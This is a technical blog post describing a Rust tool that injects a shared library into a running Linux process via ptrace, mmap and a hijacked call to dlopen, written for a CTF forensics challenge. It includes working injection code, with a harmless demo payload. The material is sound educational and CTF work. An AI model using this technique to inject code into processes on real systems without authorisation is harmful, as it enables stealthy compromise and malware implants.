+++
title = "Linux Process Injection"
description = "Dynamic Library Injection on Linux using Rust"
date = 2023-11-05T16:37:00+01:00
tags = ["linux,", "rust,", "ctf"]
draft = false
[header]
  image = "preview/thumbnail.jpg"
  caption = "Dynamic Library Injection on Linux using Rust."
+++

<div class="ox-hugo-toc toc">

<div class="heading">Table of Contents</div>

- [Introduction](#introduction)
- [Dynamic Libraries](#dynamic-libraries)
- [Injecting Dynamic Libraries](#injecting-dynamic-libraries)
    - [Windows](#windows)
    - [Linux](#linux)
- [Implementation](#implementation)
    - [Locate `libc`](#locate-libc)
    - [Get Function Address](#get-function-address)
    - [Process Manipulation](#process-manipulation)
    - [Allocate Memory](#allocate-memory)
    - [Write Library Path](#write-library-path)
    - [Call `dlopen()`](#call-dlopen)
- [Putting it Together](#putting-it-together)
- [Final Notes](#final-notes)
- [Code](#code)

</div>
<!--endtoc-->



## Introduction {#introduction}

This year, I contributed some challenges to the Cyber Security Challenge Germany ([CSCG](https://cscg.de/)), a CTF for young IT security talents, which also serves as the German qualification for the European Cyber Security Challenge ([ECSC](https://ecsc.eu/)).
For the on-site finals, I created a small Windows Live Forensics challenge where each team was given RDP access to a Windows server and a scenario where they had to act as incident responders.

The server was infected with an unknown malware that injected a DLL into a remote process. The DLL, or implant, was communicating with a C2 server. This channel was used to receive further commands or retrieve the flag.

As the CSCG final was an on-site event with few participants, and incident response/live forensics challenges seem to be quite rare, I wanted to reuse the challenge for the public [CCCamp 2023](https://ctftime.org/event/2048) CTF. Nevertheless, since spawning a dedicated Windows server per team does not scale well, I decided to port the challenge to Linux.

To avoid starting from scratch, I decided to stick to injecting the implant as a dynamic library, which I could port to Linux by simply compiling them as a shared object file (.so) instead of the DLL.
This way, I only had to modify the injector, which I assumed wouldn't be much more difficult than on Windows.
However, I soon realized that Linux lacks the convenient Win32 API functions for manipulating remote processes, such as `VirtualAllocEx` or `WriteProcessMemory`.

I discovered some existing projects that address remote process injection on Linux. However, [linux-inject](https://github.com/gaffe23/linux-inject/) <a href="#citeproc_bib_item_1">[1]</a>, which is pretty old,
did not work for my implant on latest Ubuntu machines. The other project I found, part of [linux-prinj](https://github.com/antifob/linux-prinj/) <a href="#citeproc_bib_item_2">[2]</a>, is written in Python,
which did not really meet my requirements.

Rather than debugging existing tools, I chose to develop my own in Rust. This decision was influenced by the fact that the implant was written in Rust and the context around the challenge suggested Rust malware.
My implementation is a Rust adaptation of the Python implementation by [linux-prinj](https://github.com/antifob/linux-prinj/) [antifob](https://github.com/antifob), with some aspects being more of a direct port.

This post introduces my Rust library, [so_injection](https://github.com/d0ntrash/so_injection), which injects a shared object into a running process.
If you are interested in the CTF challenge, you can check out the [source](https://github.com/allesctf/campctf-2023/tree/main/challenges/live-forensics) or a [writeup](https://spiker00t.github.io/live-forensics) by spiker00t.
For further details on Linux process injection techniques in general, see [antifob](https://blog.f0b.org/2022/05/process-injection-on-linux-introduction/)'s great blog series <a href="#citeproc_bib_item_3">[3]</a>.


## Dynamic Libraries {#dynamic-libraries}

The concept behind dynamic libraries, or shared libraries, is pretty much the same on both Linux and Windows.
Windows refers to them as dynamic-link libraries (DLL), while on Linux they're known as shared objects (so). As such, DLL injection is the term commonly used for dynamic library injection on Windows, and shared object injection is what I will call it on Linux.

A dynamic library usually holds reusable code that can be shared by multiple programs at the same time.  These libraries are loaded into a program's memory at runtime, allowing it to access their functions and resources.
On Linux, the dynamic library most frequently utilized is `libc.so`, whereas on Windows, it is `kernel32.dll` and `ntdll.dll`.

Normally, a dynamic library is loaded using an API function provided by the operating system.
On Windows, this is [`LoadLibrary`](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya), which is part of the Win32 API, and on Linux, its [`dlopen`](https://man7.org/linux/man-pages/man3/dlopen.3.html), part of libc.
Once the library is loaded, the host process can resolve exported functions by their symbols and invoke them.
Also, a dynamic library can declare an automatically called constructor upon loading.


## Injecting Dynamic Libraries {#injecting-dynamic-libraries}

Injecting dynamic libraries is a technique that is often used and abused for various purposes, such as debugging, adding functionality, or modifying the behavior of a running program.

A library can either be injected at runtime by interacting with a running process, or it can be preloaded into a program's address space before it starts. The dynamic method is largely used on Windows, such as by EDRs or anti-cheat engines, while preloading is predominantly used on Linux.


### Windows {#windows}

As mentioned above, injecting DLLs is easy on Windows because Windows provides an API that does most of the work.
The following provides an overview of the basic procedure:

-   `OpenProcess()`: Get the handle for a running process with full access privileges
-   `VirtualAllocEx()`: Allocates memory in the address space or a remote process
-   `WriteProcessMemory()`: Write the path to the DLL that should be injected into the newly allocated buffer
-   `GetModuleHandle()` and `GetProcAddress()`: Get the handle for `kernel32.dll`, then get the address of `LoadLibraryA` in `kernel32.dll`
-   `CreateRemoteThread()`: Create a new thread in the context of the remote process

The newly created thread loads the DLL we want to inject into the target process by calling `LoadLibraryA` with the DLL's path as a parameter.
Once the loading is complete, the DLL's entry point `DllMain` is called.

As shown, injecting DLLs on Windows is as simple as calling certain Win32 API endpoints.
On Linux, unfortunately, it is not as simple.


### Linux {#linux}

When thinking about shared object injection under Linux, the first thing that comes to mind is `LD_PRELOAD`.
`LD_PRELOAD` is an environment variable that specifies a list of shared libraries to be loaded by the linker before any others when starting a program.

Obviously, this approach does not permit the injection of libraries at runtime. Therefore, we need to implement a method similar to the Windows approach described above.
Fortunately, the C standard library `libc`, which is loaded by most programs, offers us the Linux equivalent to `LoadLibrary`, [`dlopen()`](https://man7.org/linux/man-pages/man3/dlopen.3.html), which loads a dynamic library file from disk.
However, Linux lacks convenient API functions for remote process manipulation as Windows provides.
Therefore, we need to figure out another way to mess with the target process. For this we will use [`ptrace`](https://man7.org/linux/man-pages/man2/ptrace.2.html).

`ptrace` is a Linux system call that enables a process to observe and control another process.
Although primarily intended for debugging, we can also use it to read and write to the memory of other processes,
which is all we need since it also allows us to override instructions to build our own remote API.
For an in-depth overview of `ptrace`, refer to Eli Bendersky's [post](https://eli.thegreenplace.net/2011/01/23/how-debuggers-work-part-1) on how debuggers work <a href="#citeproc_bib_item_4">[4]</a>.

> Obviously, the prerequisite for this is that `libc.so` is loaded by the remote process.
> Since this is the case for almost every process, I will consider this a given.
> Similarly, on Windows, the same is implied for `kernel32.dll` (or `ntdll.dll`, which can be used instead).
> If the library is not yet loaded or if you want to inject a bit more stealthily, you can implement the loader yourself.
> For Linux, Amos's great "Making our own executable packer" [series](https://fasterthanli.me/series/making-our-own-executable-packer) might be a good place to start.
> For Windows, I previously created a basic `LoadLibrary` [implementation](https://github.com/d0ntrash/load_library_rs), which I may cover in a future post.


## Implementation {#implementation}

The concept behind this shared object injection is quite similar to the one described for Windows.

-   Locate `libc` inside the targets address space
-   Find the offset of `dlopen()` in the given `libc` version
-   Allocate some memory in the target's address space to hold the library path
-   Write the path into the allocated buffer
-   Finally, make the target process call `dlopen()` to load an run the library

> Some other implementations for shared object injection on Linux use `__libc_dlopen_mode()` instead of `dlopen()`.
> I believe this was necessary because `dlopen()` was included in `libc`, but instead externalized to `libdl`,
> which exported `dlopen()` and called `libc`'s `_libc_dlopen_mode()` internally.
>
> However, `libdl` has been merged into `libc`, which now directly exports `dlopen()`.
> Consequently, `_libc_dlopen_mode()` does not need to be exported anymore, and thus, it has been stripped.
> This seems to be the reason why older implementations did not work for me.


### Locate `libc` {#locate-libc}

Of course, we could use `ptrace` to read the target address space and look for the `libc.so` there.
However, to make it simpler, we will take advantage of the fact that Linux writes information about the memory mappings of each process to `/proc`.
To examine the memory map for a particular process, we can refer to `/proc/<pid>/maps`, where `<pid>` is the process ID of the target process.

For instance, by examining the process map of the command `sleep 100000`, we can obtain all necessary information:

<a id="code-snippet--proc maps"></a>
```text
		 address          perms  offset   dev   inode                        pathname
55beba31b000-55beba31d000 r--p 00000000 fe:02 6033456                    /usr/bin/sleep
55beba31d000-55beba321000 r-xp 00002000 fe:02 6033456                    /usr/bin/sleep
55beba321000-55beba322000 r--p 00006000 fe:02 6033456                    /usr/bin/sleep
55beba323000-55beba324000 r--p 00007000 fe:02 6033456                    /usr/bin/sleep
55beba324000-55beba325000 rw-p 00008000 fe:02 6033456                    /usr/bin/sleep
55bebc02a000-55bebc04b000 rw-p 00000000 00:00 0                          [heap]
7f6322658000-7f63226af000 r--p 00000000 fe:02 6033566                    /usr/lib/locale/C.utf8/LC_CTYPE
7f63226af000-7f63226b2000 rw-p 00000000 00:00 0
7f63226b2000-7f63226da000 r--p 00000000 fe:02 5660105                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f63226da000-7f632286f000 r-xp 00028000 fe:02 5660105                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f632286f000-7f63228c7000 r--p 001bd000 fe:02 5660105                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f63228c7000-7f63228cb000 r--p 00214000 fe:02 5660105                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f63228cb000-7f63228cd000 rw-p 00218000 fe:02 5660105                    /usr/lib/x86_64-linux-gnu/libc.so.6
7f63228cd000-7f63228da000 rw-p 00000000 00:00 0
7f63228db000-7f63228e2000 r--s 00000000 fe:02 5660073                    /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
7f63228e2000-7f63228e4000 rw-p 00000000 00:00 0
7f63228e4000-7f63228e6000 r--p 00000000 fe:02 5660087                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f63228e6000-7f6322910000 r-xp 00002000 fe:02 5660087                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f6322910000-7f632291b000 r--p 0002c000 fe:02 5660087                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f632291c000-7f632291e000 r--p 00037000 fe:02 5660087                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7f632291e000-7f6322920000 rw-p 00039000 fe:02 5660087                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
7fffbe9dc000-7fffbe9fd000 rw-p 00000000 00:00 0                          [stack]
7fffbea37000-7fffbea3b000 r--p 00000000 00:00 0                          [vvar]
7fffbea3b000-7fffbea3d000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
```

Even a simple program like `sleep` loads `libc`  and a few additional libraries.

In our particular case, we are only interested in entries that contain `libc` in their path names.
In fact, we only need the path name and start address of the first entry, since that will be our entry point into the targets `libc`.

```rust
/// Get MapRange for `so_name` in target process
fn get_so_map(pid: Pid, so_name: &str) -> Option<MapRange> {
    // Get Process map
    let maps = get_process_maps(pid.into()).expect("Failed to get the process map of: {pid}");
    for map in maps {
	if let Some(filename) = map.filename() {
	    if Path::new(filename).file_name()
		.and_then(|name| name.to_str())
		.map(|name| name.contains(so_name))
		.unwrap_or(false)
	    {
		return Some(map);
	    }
	}
    }
    None
}
```

I am using the [proc_maps](https://docs.rs/proc-maps/latest/proc_maps/) crate to fetch and parse the maps of a particular process.
This enables me to iterate over all the maps to return the first one that matches the path name we are looking for.


### Get Function Address {#get-function-address}

To later use `dlopen()` for loading a library, we need to first locate the function within the loaded `libc` version.
In the previous step, we obtained the map for `libc`, which also contains the absolute path to the `libc.so` library.
So instead of searching the copy loaded by the target process, we can read and search the original file from disk.

```rust
/// Find an offset of a given function in a given ELF file by resolving symbols
fn get_function_offset(filename: &str, function_name: &str) -> Option<u64> {
    let data = std::fs::read(filename).expect("Cant read libc!");
    let obj = Elf::parse(&data).expect("Failed to parse ELF file");

    fn find_offset(symtab: &goblin::elf::Symtab, strtab:  &goblin::strtab::Strtab, function_name: &str) -> Option<u64> {
	symtab.iter().find(|sym| {
	    if let Some(Ok(name_bytes)) = strtab.get(sym.st_name as usize) {
		if let Ok(name) = std::str::from_utf8(name_bytes.as_bytes()) {
		    return name.trim_end_matches('\0') == function_name;
		}
	    }
	    false
	}).map(|sym| sym.st_value)
    }

    // Try to find the function in dynsyms first
    if let Some(offset) = find_offset(&obj.dynsyms, &obj.dynstrtab, function_name) {
	return Some(offset);
    }

    // If not found in dynsyms, search in syms
    find_offset(&obj.syms, &obj.strtab, function_name)
}
```

After parsing the `libc` library using [goblin](https://docs.rs/goblin/latest/goblin/index.html), we can iterate over the symbol tables to find the desired function name.

> Each ELF file includes two tables: the dynamic symbol table (`.dynsym`) and the symbol table (`.symtab`).
> The dynamic symbol table provides information about exported symbols, such as functions or variables, that are available for dynamic linking.
> For instance, a public function in a shared library.
> This table is used at runtime when the ELF is loaded to resolve the symbols so that other programs can use and reference the exported symbols.
> The symbol table, primarily utilized for debugging purposes, includes all symbols, even those not intended for external use.
> But when a binary is stripped, all debugging information and symbols not needed for dynamic linking are removed (stripped) from both tables.

```c
// Symbol Table Struct
typedef struct {
	Elf64_Word	st_name;
	unsigned char	st_info;
	unsigned char	st_other;
	Elf64_Half	st_shndx;
	Elf64_Addr	st_value;
	Elf64_Xword	st_size;
} Elf64_Sym;
```

The symbol table includes the name and address of each symbol.
By iterating over the symbol table, we can use the `st_name`, an index into the symbol string table, to get the symbol name.
If the name matches the desired function name, the associated `st_value` will give us the function's offset from the library's base address.

> An alternative and probably easier approach to get a function offset would be to use the [libc](https://slog-rs.github.io/slog/libc/index.html) crate to `dlopen()` the `libc.so` in
> our injector process and use its `dlsym()` to get the address of `dlopen()` in the newly loaded copy of `libc`.
>
> ```c
> handle = dlopen("libc.so");
> addr = dlsym(handle, "dlopen\0");
> ```


### Process Manipulation {#process-manipulation}

To perform the final steps, we will inject instructions and modify register values of the target process.
First, we have to make it allocate some memory (or find some code caves to write to), where we then write the path to the implant library.
Finally, we make it call `dlopen()` to load and run the library.

Before manually overwriting instructions and registers, it is necessary to save the state of the process to be restored later.

````rust
struct Snapshot {
    registers: user_regs_struct,
    instruction: i64,
    pid: Pid,
}
````

````rust
impl Snapshot {
    fn new(pid: Pid) -> Result<Self, nix::Error> {
	// Get and save the current register values of the target process
	let registers = ptrace::getregs(pid)?;

	// Save the instruction at the current rip
	let instruction = ptrace::read(pid, registers.rip as *mut c_void)?;

	Ok(Self {
	    registers,
	    instruction,
	    pid,
	})
    }

    fn restore(self) -> Result<(), nix::Error> {
	// Restore the original registers
	ptrace::setregs(self.pid, self.registers)?;

	// Restore the saved instruction
	unsafe {
	    ptrace::write(
		self.pid,
		self.registers.rip as *mut c_void,
		self.instruction as *mut c_void,
	    )?
	};
	Ok(())
    }
}
````

The `Snapshot` struct holds both the registers and the next instruction at the point where the snapshot was taken.
The process can later be restored to its original state by calling `restore()`.


### Allocate Memory {#allocate-memory}

To allocate memory, we make the target process trigger the [`mmap()`](https://www.man7.org/linux/man-pages/man2/mmap.2.html) system call,
which creates a new mapping in the virtual address space and returns the address.

````rust
// Attach to the target process
ptrace::attach(pid)?;

// Wait until the process stops
waitpid(pid, None)?;

let snapshot = Snapshot::new(pid)?;
let mut regs = snapshot.registers.clone();

// Set up the registers for the mmap() system call
regs.rax = 9; // syscall for mmap()
regs.rdi = 0;
regs.rsi = so_path.len() as u64;
regs.rdx = 5; // PROT_WRITE | PROT_READ
regs.r10 = 0x22; // MAP_ANONYMOUS | MAP_PRIVATE
regs.r8 = u64::MAX;
regs.r9 = 0;

// Overwrite registers
ptrace::setregs(pid, regs)?;

// Overwrite the instruction with a syscall (0x50f)
unsafe { ptrace::write(pid, regs.rip as *mut c_void, 0x50f as *mut c_void)? };

// Execute mmap() to map a new page
ptrace::step(pid, None)?;
waitpid(pid, None)?;

// Get the address of the new page
let mut regs_updated = ptrace::getregs(pid)?;
let address = regs_updated.rax;

snapshot.restore()?;
````

First, we attach to the remote process and wait for it to stop.
Next, we take a snapshot and set up the registers for the `mmap` system call.
We pass the length of the path and the desired access permissions for the new map.
Then we overwrite the instruction that would be executed next with the `syscall` instruction.

Using `ptrace`, we execute the next instruction, which is the system call.
We then save the address of the new map, which is returned in `rax` by `mmap`.
Finally, by using our snapshot, we restore the state of the process.


### Write Library Path {#write-library-path}

Given the address of the new map, we can write the path of the implant library to the target's memory.

````rust
// Write the shared object path to the new page in the target process memory
let path_bytes = so_path.as_bytes();
for chunk in path_bytes.chunks(8) {
    let mut padded_chunk = [0u8; 8];
    for (i, &byte) in chunk.iter().enumerate() {
	padded_chunk[i] = byte;
    }
    unsafe {
	ptrace::write(
	    pid,
	    regs_updated.rax as *mut c_void,
	    u64::from_ne_bytes(padded_chunk) as *mut c_void,
	)?
    };
    regs_updated.rax += 8;
}

ptrace::detach(pid, None)?;

// Return address of path in target process memory
Ok(address)
````


### Call `dlopen()` {#call-dlopen}

Now that we have the address of both `dlopen()` and the path string, we can finally call `dlopen()` to load and run the implant library.

````rust
// Attach to the target process
ptrace::attach(pid)?;

// Wait until the process stops
waitpid(pid, None)?;

let snapshot = Snapshot::new(pid)?;
let mut regs = snapshot.registers.clone();

regs.rdi = p_so_path;
regs.rsi = 1; // RTLD_LAZY
regs.r9 = p_dlopen;

ptrace::setregs(pid, regs)?;

// call r9; int 3  0xccd1ff41
unsafe {
    ptrace::write(
	pid,
	snapshot.registers.rip as *mut c_void,
	0xccd1ff41 as *mut c_void,
    )?
};
ptrace::cont(pid, None)?;
waitpid(pid, None)?;

snapshot.restore()?;

ptrace::detach(pid, None)?;
Ok(())
````

Again, as in the case of calling `mmap`, we take a snapshot, set up the registers, and overwrite the next instruction.
Instead of triggering a system call, we now use the `call` instruction to call a function at the address stored in `r9`.
Following the `call r9` instruction, we write a `int 3` (0xCC), which causes a `SIGTRAP` signal that the injector will wait to restore the state after `dlopen()` returned.

At this point, the remote process should have loaded our library and executed the constructor!


## Putting it Together {#putting-it-together}

To inject the library, we need to combine all these steps.
For demonstration purposes, a simple shared library that only implements a constructor will suffice.

````rust
use ctor::*;

#[ctor]
fn constructor() {
    println!("Injected!");
}
````

````text
running 1 test
test tests::test_inject_by_name ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.13s

Doc-tests so_injection

running 0 tests

test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s

root@808ffe483cb2:/dev_fuzzer#
──────────────────────────────────────────────────────────────────────────────────────────────
root@808ffe483cb2:/dev_fuzzer# tail -f test
Injected!
````

As shown in the example output, the library was successfully injected into the `tail` process, triggering the constructor to print "Injected!".


## Final Notes {#final-notes}

Although this method works for simple remote processes, when targeting more complex multi-threaded programs,
this approach seems to have some problems and sometimes crashes the remote process.
In fact, this also caused problems during the CTF, as I injected into `sshd` leading to random process crashes.
As participants were accessing the server via ssh, they sometimes had to reset the machine.

I have not yet been able to identify the cause of the issue. So if you have an idea how to fix it, or any other feedback, please let me know.


## Code {#code}

<https://github.com/d0ntrash/so_injection>

## References

<style>.csl-left-margin{float: left; padding-right: 0em;}
 .csl-right-inline{margin: 0 0 0 1em;}</style><div class="csl-bib-body">
  <div class="csl-entry"><a id="citeproc_bib_item_1"></a>
    <div class="csl-left-margin">[1]</div><div class="csl-right-inline">gaffe23, “linux-inject.” https://github.com/gaffe23/linux-inject/, 2015.</div>
  </div>
  <div class="csl-entry"><a id="citeproc_bib_item_2"></a>
    <div class="csl-left-margin">[2]</div><div class="csl-right-inline">antifob, “Linux process injection - PoCs.” https://github.com/antifob/linux-prinj/blob/main/17-solib/inject.py, 2022.</div>
  </div>
  <div class="csl-entry"><a id="citeproc_bib_item_3"></a>
    <div class="csl-left-margin">[3]</div><div class="csl-right-inline">antifob, “Process Injection on Linux.” https://blog.f0b.org/2022/05/process-injection-on-linux-introduction/, 2022.</div>
  </div>
  <div class="csl-entry"><a id="citeproc_bib_item_4"></a>
    <div class="csl-left-margin">[4]</div><div class="csl-right-inline">E. Bendersky, “How debuggers work.” https://eli.thegreenplace.net/2011/01/23/how-debuggers-work-part-1, 2011.</div>
  </div>
</div>
